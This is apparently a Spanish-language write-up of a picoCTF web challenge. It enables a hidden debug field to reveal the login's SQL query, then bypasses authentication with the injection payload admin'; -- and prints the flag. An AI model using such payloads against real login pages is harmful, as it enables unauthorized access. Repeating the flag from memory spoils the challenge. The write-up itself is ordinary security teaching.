## Objetivo:
There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751

**Hints:**
1. The password is being filtered.

## Solución:
1. Al inspeccionar la página de inicio de sesión, podemos encontrar que hay un campo del formulario oculto llamado `debug`. por lo tanto lo establecemos en 1:

```html
<input type="hidden" name="debug" value="0">

<input type="hidden" name="debug" value="1">
```

2. Al establecer el valor en `1`  e ingresar algún nombre de usuario y contraseña muestra:

```txt
username: admin
password: 1234
SQL query: SELECT * FROM users WHERE name='admin' AND password='1234'

Login failed.
```

3.  Al revisar la actividad de la red muestra un código de retorno de 500: Error interno del servidor. Esto indica la ausencia de un filtrado SQL adecuado. Una simple inyección SQL de `admin; --` obtenemos la bandera:

```txt
username: admin'; --
password: 1234
SQL query: SELECT * FROM users WHERE name='admin'; --' AND password='1234'

Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_c34df170}
```

### Flag: picoCTF{m0R3_SQL_plz_c34df170}

## Notas adicionales:

### SQL Injection:
La inyección SQL es una técnica de inyección de código que podría destruir su base de datos. La inyección SQL es una de las técnicas de piratería web más comunes. La inyección SQL es la colocación de código malicioso en declaraciones SQL, a través de la entrada de una página web.

## Referencias:
- https://www.w3schools.com/sql/sql_injection.asp